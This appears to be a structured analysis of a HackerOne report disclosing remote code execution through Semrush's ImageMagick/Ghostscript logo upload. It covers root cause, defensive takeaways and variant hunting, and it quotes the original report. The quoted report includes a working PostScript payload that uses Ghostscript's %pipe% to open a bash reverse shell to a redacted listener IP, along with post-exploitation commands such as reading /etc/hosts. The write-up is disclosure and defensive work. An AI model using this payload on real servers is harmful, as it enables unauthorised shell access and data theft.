# Remote Code Execution via ImageMagick PostScript/Ghostscript in Logo Upload

## Metadata
- **Source:** HackerOne
- **Report:** 403417 | https://hackerone.com/reports/403417
- **Submitted:** 2018-08-31
- **Reporter:** fransrosen
- **Program:** Semrush
- **Bounty:** Not specified in report
- **Severity:** Critical
- **Vuln:** Remote Code Execution, Improper Input Validation, Unsafe Image Processing, Command Injection via ImageMagick
- **CVEs:** None
- **Category:** memory-binary

## Summary
The logo upload functionality in Semrush's report constructor processes user-supplied images through a vulnerable version of ImageMagick without proper policy restrictions. An attacker can upload a crafted PostScript file disguised as an image to trigger Ghostscript execution, achieving unauthenticated remote code execution on the server.

## Attack scenario
1. Attacker navigates to https://www.semrush.com/my_reports/constructor and locates the logo upload functionality
2. Attacker crafts a malicious PostScript payload containing a bash reverse shell command and saves it with a .jpg extension
3. Attacker uploads the file through the logo upload form, bypassing basic file type validation
4. ImageMagick processes the file and, due to unrestricted policies, delegates PostScript handling to Ghostscript
5. Ghostscript interprets the %!PS directives and executes the embedded bash command via %pipe% operator
6. Attacker gains shell access to the server, confirming code execution through directory listing and file access

## Root cause
ImageMagick was configured with an overly permissive policy.xml that did not disable dangerous formats (EPS, PS, PDF, XPS). These formats can delegate processing to external tools like Ghostscript, which interprets arbitrary PostScript code. The upload mechanism lacked proper validation to restrict file types to safe formats (GIF, JPG, PNG only).

## Attacker mindset
The attacker systematically identified that image processing was delegated to ImageMagick and researched known CVEs involving PostScript injection. They crafted a polyglot payload that appears as a JPEG but contains executable PostScript directives. Post-exploitation, they validated the vulnerability by checking internal hostnames in /etc/hosts and accessing application directories, demonstrating full system compromise for a responsible disclosure.

## Defensive takeaways
- Implement strict ImageMagick policy.xml configurations: disable EPS, PS, PDF, XPS, and allow only GIF, JPG, PNG formats
- Perform server-side file type validation using magic byte analysis (file signatures), not just extension checking
- Run ImageMagick in a sandboxed environment with minimal privileges and resource limits
- Keep ImageMagick patched to the latest version and monitor security advisories from Tavis Ormandy and oss-security mailing list
- Use alternative image processing libraries with better security postures if available
- Implement Web Application Firewall (WAF) rules to detect PostScript/Ghostscript patterns in uploads
- Monitor and log all file upload activities, particularly those processed by ImageMagick
- Conduct regular security audits of all file upload and processing endpoints

## Variant hunting
Check other upload endpoints (avatars, backgrounds, user content) that may use similar ImageMagick processing
Investigate if PDF upload functionality exists (also vulnerable to Ghostscript)
Test other image manipulation features (resize, filter, conversion) that may process user images
Look for similar vulnerabilities in third-party integrations or embedded content processors
Review API endpoints for file upload that may not have frontend validation

## MITRE ATT&CK
- T1190 - Exploit Public-Facing Application
- T1059 - Command and Scripting Interpreter
- T1566 - Phishing
- T1204 - User Execution
- T1027 - Obfuscated Files or Information

## Notes
This is a high-impact RCE vulnerability exploiting CVE-class issues in ImageMagick's ImageMagick-6.9.9-20 and earlier versions. The vulnerability was well-publicized by security researcher Tavis Ormandy. The reporter demonstrated responsible disclosure by validating the vulnerability before reporting. The PostScript payload uses %pipe% operator which is a known Ghostscript feature for command execution. This represents a critical gap between development (needing image flexibility) and security (needing strict constraints). The report includes redacted evidence of actual code execution on production infrastructure.

## Full report
<details><summary>Expand</summary>

The Logo upload in the report constructor at: https://www.semrush.com/my_reports/constructor

{F340480}

is passed through a not properly patched version of ImageMagick. You can use Postscript to get Ghostscript to run which in return allows to trigger arbitrary commands on the server, leading to Remote Code Execution. Tavis Ormandy has also mentioned recently that the policy.xml needs to disable EPS,PS,PDF and XPS since all these have ways to trigger Ghostscript: http://openwall.com/lists/oss-security/2018/08/21/2

The following PoC-payload was used to get a reverse shell when issuing the upload:

Save it as `test.jpg` and upload it as an image for the logo:

```
%!PS
userdict /setpagedevice undef
legal
{ null restore } stopped { pop } if
legal
mark /OutputFile (%pipe%bash -c 'bash -i >& /dev/tcp/███/8080 0>&1') currentdevice putdeviceprops
```

(`█████` is the IP of my listener)

This resulted in:

```
█████████
██████████
ls
███████
██████████
app
████████
██████████
████
████████
██████
███
█████████
████████
██████
█████████
█████████
█████
██████████
█████
██████
█████████
███
█████
██████
████
█████
█████████
███████
████████
███
███


███
whoami
████
███████
██████
```

At this point I wasn't sure if this was a third party or not, so I checked two things:

## `██████` to list files in the ██████ dir. It showed me:

```
█████████
███
████████
████████
███████
█████
████
█████████
████
██████████
```

I navigated to 

```
https://www.semrush.com/my_reports/████
https://www.semrush.com/my_reports/████████
```

And confirmed those two files exists in this directory.

## `/etc/hosts`

This one confirmed it by:

```
cat /etc/hosts
127.0.0.1 localhost
█████ ████.semrush.net ███
████████ ███████
```

I'm certain this is a SEMrush-instance.

{F340481}

You should urgently make sure your policy.xml for imagemagick ONLY allows gif,jpg,png and nothing else.

Regards,
Frans

## Impact

#

</details>

---
*Analysed by Claude on 2026-05-24*
